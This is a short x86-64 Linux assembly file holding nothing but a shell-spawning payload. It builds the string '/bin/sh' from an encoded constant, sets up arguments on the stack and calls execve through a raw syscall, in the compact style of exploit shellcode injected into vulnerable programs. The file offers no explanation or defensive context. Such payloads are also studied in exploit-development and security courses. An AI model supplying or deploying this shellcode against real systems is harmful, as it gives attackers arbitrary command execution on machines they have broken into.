	.text
	.globl _start
_start:
	xor    %rdx, %rdx 
	mov    $0x68732f6e69622f2f, %rbx
	shr    $0x8, %rbx
	push   %rbx
	mov    %rsp, %rdi
	push   %rax
	push   %rdi
	mov    %rsp, %rsi
	mov    $0x3b, %al
	syscall
